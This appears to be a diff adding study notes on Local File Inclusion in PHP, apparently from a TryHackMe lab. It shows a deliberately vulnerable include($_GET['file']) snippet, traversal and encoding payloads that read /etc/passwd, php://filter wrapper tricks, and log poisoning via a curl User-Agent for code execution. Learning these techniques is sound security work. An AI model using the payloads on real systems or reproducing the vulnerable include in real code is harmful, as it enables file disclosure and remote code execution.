@@ -1,0 +1,39 @@
+Local File Inclusion (LFI)
+
+An LFI vulnerability is found in various web applications. As an example, in the PHP, the following functions cause this kind of vulnerability:
+
+  include
+  require
+  include_once 
+  require_once 
+  
+Example of identifying and testing for LFI:
+
+  http://webapp/get.php?file=userCV.pdf
+  
+  <?php
+         include($_GET["file"]);
+  ?>
+  
+Example of bypass filter:
+
+  http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
+  http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
+  http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
+  http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
+
+Example of bypass filter with PHP filter:
+
+  http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
+  http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+  
+LFI to RCE via Log files:
+
+  curl -A "This is testing" http://LAB_WEB_URL.p.thmlabs.com/login.php        | -A mean User-Agent
+
+  Once we send the HTTP request using curl, now using a registered user, we can check the log page to see if we can add the User-Agent that we sent.
+
+  curl -A "<?php phpinfo();?>" http://LAB_WEB_URL.p.thmlabs.com/login.php
+
+  Now using the LFI, load the log file to get the PHP code executed. Note that it is important to visit the log file via LFI. Once you call the log file, we see the PHP information page.
+
